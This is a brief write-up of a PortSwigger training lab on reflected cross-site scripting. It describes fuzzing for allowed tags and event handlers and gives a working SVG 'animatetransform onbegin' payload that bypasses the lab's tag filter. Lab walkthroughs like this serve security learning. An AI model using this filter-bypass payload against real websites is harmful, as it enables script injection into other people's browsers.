# Reflected XSS with some SVG markup allowed

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Perform a XSS attack that calls the alert() function.

### Analysis/Exploitation

Find which tags are allowed by brutforcing all tags from intruder ** <§§>**
Then Find the allowed event handler ** <svg><animatetransform%20§§=1>**
XSS cheat sheet

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/b93c8bd344a1_001.png)

Use payload** <svg><animatetransform onbegin=alert(1) attributeName=transform>**

### Why It Works

The application has a simple reflected XSS vulnerability in the application, which can be exploited by crafting input that bypasses the insufficient validation in place.

### Key Takeaways

- The simple reflected XSS vulnerability is exploitable because user input is processed without adequate validation.
